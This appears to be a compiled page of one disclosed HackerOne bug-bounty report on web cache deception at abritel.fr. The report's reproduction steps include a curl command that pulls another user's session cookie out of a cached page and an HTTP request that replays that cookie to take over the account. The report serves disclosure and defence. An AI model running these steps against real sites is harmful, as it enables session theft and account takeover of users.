# Use of Cache Containing Sensitive Information

_1 reports — High/Critical, disclosed_

### [Cache Deception Allows Account Takeover](https://hackerone.com/reports/1698316)

- **Report ID:** `1698316`
- **Severity:** High
- **Weakness:** Use of Cache Containing Sensitive Information
- **Program:** Expedia Group Bug Bounty
- **Reporter:** @bombon
- **Bounty:** - usd
- **Disclosed:** 2023-04-01T20:00:17.641Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

I'm able to extract user's session (HASESSIONV3) as it is disclosed in a cacheable page, allowing me to access  the `ha.crumb` token located in  `/traveler/profile/edit` 


```http
GET /traveler/profile/edit HTTP/2
Host: www.abritel.fr
Cookie: HASESSIONV3=<use the token here>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.abritel.fr/search/keywords:soissons-france-(xss)/minNightlyPrice/0?petIncluded=false&filterByTotalPrice=true&ssr=true
Upgrade-Insecure-Requests: 1
Te: trailers
```


## Steps To Reproduce:

Victim Steps:

1->Visit https://www.abritel.fr/search/keywords:soissons-france-(xss)/minNightlyPrice/x.jpeg?triagethis

Attacker Steps:

1->Visit the same URL using any other browser or do 

```curl 'https://www.abritel.fr/search/keywords:soissons-france-(xss)/minNightlyPrice/x.jpeg?triagethis' --compressed | grep -i 'HASESSIONV3'```

{F1923081}


2-> use the token 

```http
GET /traveler/profile/edit HTTP/2
Host: www.abritel.fr
Cookie: HASESSIONV3=<use the token here>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.abritel.fr/search/keywords:soissons-france-(xss)/minNightlyPrice/0?petIncluded=false&filterByTotalPrice=true&ssr=true
Upgrade-Insecure-Requests: 1
Te: trailers
```

and look for the `ha.crumb` variable in the response




## Recommended Remediation Steps 
  1. Add cache rules for certain all cacheable extensions

## Impact

Account Takeover

**Summary (researcher):**

I was able to Takeover Accounts via Cache Deception

This was possible due to:

1. The Session Token was reflected on https://www.abritel.fr/search/keywords:soissons-france-(xss)/minNightlyPrice/{anything} and the server was responding with a 200 Ok (200 Ok responses allows the cache to last a lot longer than any other response)

2. The Caching Server sees https://www.abritel.fr/search/keywords:soissons-france-(xss)/minNightlyPrice/cached.jpeg as a "cacheable" response, due to `jpeg` extension at the end of the URL, the server will save it


Team fixed this by removing the Session Token from all pages, which is what I now recommend for all programs.

[X](https://twitter.com/bxmbn)

---
